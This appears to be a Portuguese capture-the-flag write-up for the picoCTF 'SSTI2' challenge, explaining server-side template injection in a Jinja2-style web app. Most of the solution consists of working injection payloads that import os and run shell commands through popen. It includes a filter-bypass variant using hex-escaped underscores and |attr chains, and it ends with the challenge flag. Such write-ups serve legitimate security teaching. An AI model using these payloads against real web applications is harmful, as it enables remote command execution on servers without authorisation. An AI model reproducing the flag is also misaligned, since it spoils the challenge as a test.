# 🦆 DuckWare - SSTI2

---

>	Autor: @Ralfbp{Z4π}
---
## ✨ Desafio: Web Exploitation

> Link do desafio: https://play.picoctf.org/practice/challenge/488
> Link do material: https://portswigger.net/web-security/server-side-template-injection
---
## Introdução

<center><img src= 'SSTI2 fotos/quest.png' ></center>

- Um desafio do site [picoCTF](https://play.picoctf.org/practice), que tem como objetivo a **Web Exploitation**
- **Web Exploitation**: explorar vulnerabilidades em aplicações web para obter acesso não autorizado, extrair informações ou executar ações indevidas.
- Neste desafio será usada a vulnerabilidade **Server-side template injection (SSTI)**.  
-   **Server-side template injection (SSTI)**: ocorre quando a entrada controlada pelo usuário é injetada diretamente em um _template_ do servidor sem o devido tratamento.

-----
## 🧩 Desafio


<center><img src= 'SSTI2 fotos/pagina.png' ></center>  

- Esta é a página exibida ao gerar e clicar no link do [picoCTF](https://play.picoctf.org/practice).

```
	# Home
	
	I built a cool website that lets you announce whatever you want!*
	
	What do you want to announce:
	
	
	
	*Announcements may only reach yourself
```


----
## 🛠️ Resolução

- Inicialmente, é ideal testar como funciona o campo de anúncio do site, por exemplo usando `{{7 * 7}}`.


<center><img src= 'SSTI2 fotos/test.png' ></center>


<center><img src= 'SSTI2 fotos/49.png' ></center>  

- O retorno `49` indica que o site está **interpretando a entrada como código dentro de um template engine**.
- Observando que o nome da questão refere-se a **Server-side Template Injection**, podemos tentar executar comandos do sistema através do template.
- Inserindo o payload abaixo no mesmo campo onde foi colocado `{{7 * 7}}`:

```

	{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}

```


<center><img src= 'SSTI2 fotos/codigo.png' ></center>  

- Esse resultado mostra que não será possível utilizar a forma literal para se encontrar a **flag**  
- Pode ser que o filtro pode bloquear os literais `__globals__`, mas não bloqueou o escape `\x5f\x5fglobals\x5f\x5f` 
-  Testando o mesmo  código com em hexadecimal

```

	{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
	
```



<center><img src= 'SSTI2 fotos/requirements.txt.png' ></center>  

-  Em seguida substituímos `ls` por `cat flag` e obtivemos o conteúdo da flag:
- Passando para hexa decimal 

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

<center><img src= 'SSTI2 fotos/flag.png' ></center>  


---- 
### ✅ Conclusão

Neste desafio identificamos uma vulnerabilidade **SSTI**: o campo de entrada era avaliado pelo motor de templates, permitindo a execução de expressões. A aplicação tentou mitigar a falha bloqueando literais suspeitos (como `__globals__`), mas a proteção foi contornada ao usar escapes hexadecimais (`\x5f` → `_`) e acesso dinâmico a atributos via `attr`/`__getitem__`. Com isso foi possível importar o módulo `os` e executar `cat flag`, revelando a flag do desafio.

**Flag:** `picoCTF{sst1_f1lt3r_byp4ss_4de30aa0}`